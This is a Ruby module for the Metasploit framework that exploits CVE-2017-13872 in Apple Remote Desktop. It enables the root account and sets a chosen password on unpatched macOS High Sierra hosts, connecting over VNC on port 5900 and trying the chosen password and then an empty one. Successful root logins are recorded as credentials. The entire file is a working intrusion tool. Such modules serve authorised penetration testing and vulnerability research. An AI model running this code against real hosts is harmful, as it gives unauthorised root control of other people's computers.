##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/rfb'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Apple Remote Desktop Root Vulnerability',
      'Description' => 'Enable and set root account to a chosen password on unpatched macOS High Sierra hosts with either Screen Sharing or Remote Management enabled.',
      'References'  =>
        [
          ['CVE', '2017-13872'],
          ['URL', 'https://support.apple.com/en-us/HT208315']
        ],
      'Author'      => 'jgor',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(5900),
        OptString.new('PASSWORD', [false, 'Set root account to this password', ''])
      ])
  end

  def log_credential(password)
    print_good("Login succeeded - root:#{password}")

    service_data = {
      address: target_host,
      port: rport,
      service_name: 'vnc',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      username: 'root',
      private_data: password,
      private_type: :password
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(target_host)
    begin
      if datastore['PASSWORD'].empty?
        password = Rex::Text::rand_text_alphanumeric(16)
      else
        password = datastore['PASSWORD']
      end

      connect
      vnc = Rex::Proto::RFB::Client.new(sock)
      if vnc.handshake
        type = vnc.negotiate_authentication
        unless type = Rex::Proto::RFB::AuthType::ARD
          print_error("VNC server does not advertise security type ARD.")
          return
        end
        print_status("Attempting authentication as root.")
        if vnc.authenticate_with_type(type, 'root', password)
          log_credential(password)
          return
        end
      else
        print_error("VNC handshake failed.")
        return
      end
      disconnect

      connect
      vnc = Rex::Proto::RFB::Client.new(sock)
      print_status("Testing login as root with chosen password.")
      if vnc.handshake
        if vnc.authenticate_with_user('root', password)
          log_credential(password)
          return
        end
      else
        print_error("VNC handshake failed.")
        return
      end
      disconnect

      connect
      vnc = Rex::Proto::RFB::Client.new(sock)
      print_status("Testing login as root with empty password.")
      if vnc.handshake
        if vnc.authenticate_with_user('root', '')
          log_credential('')
          return
        end
      else
        print_error("VNC handshake failed.")
        return
      end

    ensure
      disconnect
    end

  end
end
